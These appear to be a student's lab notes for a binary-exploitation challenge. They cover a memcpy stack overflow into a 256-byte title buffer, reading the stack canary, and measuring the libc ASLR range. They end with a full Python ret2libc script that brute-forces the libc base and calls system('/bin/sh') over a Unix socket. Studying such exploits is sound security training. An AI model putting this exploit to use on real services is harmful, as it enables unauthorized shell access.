
# Understanding the challenge 

![[Pasted image 20260710135721.png]]


Defeat Non-Executable stack 

Ret 2 lib - RECOMMENDED
Rop 

Defeat Stack Canary 

Brute - force 
guessing 

![[Pasted image 20260710140057.png]]
# How the code functions

https://linux.die.net/man/1/nc

![[Pasted image 20260710142437.png]]
![[Pasted image 20260710142747.png]]

nc -U ~/judge_sock

![[Pasted image 20260710142256.png]]
![[Pasted image 20260710142839.png]]

## Code


![[Pasted image 20260710140550.png]]

![[Pasted image 20260710140611.png]]
![[Pasted image 20260710140842.png]]
![[Pasted image 20260710140914.png]]
![[Pasted image 20260710140935.png]]

# Finding the vulnerability

![[Pasted image 20260710150634.png]]

![[Pasted image 20260710150711.png]]
 So i know buf_size 512 is allocated. 

This is called once per connection (remember, `main()` forks a new child for every `accept()`, and each child calls `process(accept_sock)` on its own copy of this socket). `buf` is a 512-byte array sitting on this function's stack frame.

len = read(sock, buf, CHUNK_SIZE);

`read()` does _not_ null-terminate anything, and it doesn't care what's in the bytes — it just copies raw bytes off the socket into `buf`. So if you send `"hi"`, `len` is 2, and only the first 2 bytes of `buf` are meaningfully set — the rest of `buf` still has leftover stack garbage from whatever used that memory before.  This function's own `read()` is capped safely at `CHUNK_SIZE`, so there's no overflow here directly

read(sock, buf, CHUNK_SIZE);
     ^      ^      ^
     |      |      |
     |      |      +-- "read AT MOST this many bytes"
     |      +--------- "put the bytes HERE" (destination address)
     +---------------- "read FROM this file descriptor"

if (len == -1) {
        die_perror("Cannot read from socket");
    } else if (len == 0) {
        puts("Received nothing, moving along");
    } else { /* Small reads are okay. */


Now the next 
![[Pasted image 20260710163408.png]]

judge is a function which is not in the code neither is judge_good here 

In the function anime.c you can see here 

![[Pasted image 20260710163522.png]]


I got to check_anime 

![[Pasted image 20260710163549.png]]

then there is this get_title 

![[Pasted image 20260710162441.png]]

now though memcpy has len it is back track through len like int len is in check_anime which is called in judge and in the process  you see len = strlen(buf) + 1

that means len 513 around 

![[Pasted image 20260710165913.png]]

now the get_title has title, buf , len 

we have the memcpy which just checks out, in and len 

which maps to memcpy(title, buf, len)

which the size of title in anime.c is 


![[Pasted image 20260710163847.png]]


and that in judge is this 

![[Pasted image 20260710164044.png]]

but it says char title[CHUNK_SIZE]
and  CHUNK_SIZE  is 256 

let me check overwriting it 

![[Pasted image 20260710165403.png]]

![[Pasted image 20260710165339.png]]

![[Pasted image 20260710165252.png]]


# Buffer size is 257. 

# Finding the canary 

![[Pasted image 20260710181453.png]]


![[Pasted image 20260710180137.png]]


Important thing to remember is that the canary will change everytime you run the program. 

# Overcoming the ASLR 

https://oliviagallucci.com/aslr-bypass-techniques-and-circumvention-impacts/

## Checking the dynamic libraries

![[Pasted image 20260711143857.png]]

The addresses shown (`0xf7f77000`, `0xf7f65000`, `0xf7d1d000`, etc.) are from **this specific run of `ldd`**, not from the actual `judge` server process. Every process gets its own independent ASLR randomization — `ldd`'s mmap layout has nothing to do with the judge server's mmap layout, even though it's the same binary and same libraries. So you can't take `0xf7d1d000` and just use it as `libc_base` in your exploit; it'll almost certainly be wrong for the actual running server.

## Confirming the ASLR 

![[Pasted image 20260711160023.png]]

![[Pasted image 20260711160928.png]]

The confirm range 0xf7f. use `0xf7` as your fixed high byte
All ten values share the top byte `0xf7`

## Range Analysis 

I ran this 

for i in {1..500}; do ldd $(which judge) 2>/dev/null | grep libc; done | awk -F'[()]' '{print $2}' | sort -u

- **Min**: `0xf7c6b000`
- **Max**: `0xf7d68000`
- **Difference**: `0xf7d68000 - 0xf7c6b000 = 0xfd000`
- **In pages**: `0xfd000 / 0x1000 = 253` pages


```python 


import socket
import struct
import time
import os


SYSTEM_OFFSET = 0x000528b0
BINSH_OFFSET  = 0x001d3808
CANARY_BYTES = bytes.fromhex("00f4a168")

FLOOR = 0xf7c60000    
CEIL  = 0xf7d70000    
STEP  = 0x1000
NUM_GUESSES = (CEIL - FLOOR) // STEP

SOCK_PATH = os.path.expanduser("~/judge_sock")  # adjust if needed

OFFSET_TO_CANARY = 256  # matches your working canary-leak script


def p32(val):
    return struct.pack("<I", val)  # little-endian 4-byte pack


def build_payload(fake_base):
    system_addr = fake_base + SYSTEM_OFFSET
    binsh_addr  = fake_base + BINSH_OFFSET

    payload  = b"A" * (OFFSET_TO_CANARY - 1)   # 255 bytes
    payload += b"\n"                            # REQUIRED: get_title() needs a
                                                  # newline or it die()s before
                                                  # ever reaching the overflow
    payload += CANARY_BYTES                       # canary (4 bytes)
    payload += b"B" * 4                          # saved EBP filler
    payload += p32(system_addr)                  # EIP -> system()
    payload += p32(0x41414141)                   # fake return addr, don't care
    payload += p32(binsh_addr)                   # arg to system(): "/bin/sh"
    return payload


RECV_TIMEOUT = 1.0          # seconds to wait for data before giving up
HANG_THRESHOLD = 0.7        # if recv() takes longer than this, treat 

def try_base(fake_base):

    payload = build_payload(fake_base)

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(RECV_TIMEOUT)

    start = time.monotonic()
    timed_out = False
    resp = None
    try:
        s.connect(SOCK_PATH)
        s.sendall(payload)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            timed_out = True
            resp = b""
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError):
        resp = None
    finally:
        elapsed = time.monotonic() - start
        try:
            s.close()
        except Exception:
            pass

    return {
        "resp": resp,
        "elapsed": elapsed,
        "timed_out": timed_out,
        "likely_hit": timed_out and elapsed >= HANG_THRESHOLD,
    }


def run_bruteforce():
    print(f"[*] Brute-forcing libc base in range {hex(FLOOR)}-{hex(CEIL)} "
          f"({NUM_GUESSES} guesses)")

    for n in range(NUM_GUESSES):
        fake_base = FLOOR + (n * STEP)
        result = try_base(fake_base)

        flag = "  <-- POSSIBLE HIT (hung)" if result["likely_hit"] else ""
        print(f"[{n}] base={hex(fake_base)} "
              f"elapsed={result['elapsed']:.3f}s "
              f"resp={result['resp']!r}{flag}")

        if result["likely_hit"]:
            print(f"\n[+] Base {hex(fake_base)} caused the connection to hang "
                  f"for {result['elapsed']:.3f}s -- this is your strongest signal "
                  f"of a successful system(\"/bin/sh\") call.")
            print(f"[+] system_addr = {hex(fake_base + SYSTEM_OFFSET)}")
            print(f"[+] binsh_addr  = {hex(fake_base + BINSH_OFFSET)}")
            return fake_base

        time.sleep(0.02)  

    print("[-] No hang detected across the whole range.")
    return None


if __name__ == "__main__":
    run_bruteforce()

```